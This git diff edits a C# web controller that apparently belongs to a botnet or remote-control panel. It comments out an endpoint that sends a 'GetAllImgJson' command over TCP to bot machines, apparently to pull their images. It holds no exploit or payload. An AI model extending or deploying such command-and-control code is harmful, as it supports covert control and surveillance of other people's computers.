@@ -582,22 +582,22 @@ namespace Alduin.Web.Controllers
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(response);
         }
-        [Authorize]
+        /*[Authorize]
         [HttpGet]
-        public async Task<IActionResult> GetAllImg()
+        public async Task<IActionResult> GetAllImg(int botid)
         {
             var method = new BaseCommands
             {
                 Method = "GetAllImgJson"
             };
-            var bots = new GetBotsByStatusQuery
+            var bot = new GetBotByIdQuery
             {
-                status = false
+                Id = botid
             };
-            var botlist = await _mediator.Send(bots);
+            var botlist = await _mediator.Send(bot);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
             return Json(response);
-        }
+        }*/
         /*[Authorize]
         [HttpPost]
         public async Task<IActionResult> GetImg([FromBody] GetImgModel model)
